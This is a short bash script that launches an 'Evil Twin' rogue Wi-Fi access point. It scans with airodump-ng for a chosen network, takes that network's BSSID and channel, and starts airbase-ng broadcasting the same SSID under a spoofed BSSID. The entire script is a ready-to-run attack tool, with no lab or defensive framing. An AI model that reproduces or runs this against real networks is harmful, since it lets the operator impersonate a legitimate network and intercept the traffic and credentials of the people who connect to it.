#!/bin/bash

# Prompt for the SSID to clone
read -p "Enter the SSID of the target network: " target_ssid
read -p "Enter your wireless interface (e.g., wlan0): " iface

# Start monitor mode
echo "[*] Starting monitor mode on $iface..."
airmon-ng start "$iface"
iface_mon="${iface}mon"

# Temp file to store airodump-ng output
tempfile="/tmp/ap_scan.csv"

echo "[*] Scanning for APs with SSID: $target_ssid (10s)..."
timeout 10 airodump-ng --essid "$target_ssid" --write-interval 1 --output-format csv -w /tmp/ap_scan "$iface_mon" >/dev/null 2>&1

# Extract first matching BSSID and channel from CSV
bssid=$(grep "$target_ssid" "$tempfile" | head -n 1 | cut -d',' -f1 | tr -d ' ')
channel=$(grep "$target_ssid" "$tempfile" | head -n 1 | cut -d',' -f4 | tr -d ' ')

if [ -z "$bssid" ] || [ -z "$channel" ]; then
    echo "[!] Failed to find AP with SSID '$target_ssid'."
    exit 1
fi

echo "[+] Found AP - BSSID: $bssid | Channel: $channel"

# Launch airbase-ng with the spoofed BSSID
echo "[*] Starting Evil Twin AP..."
airbase-ng -e "$target_ssid" -a "$bssid" -c "$channel" "$iface_mon"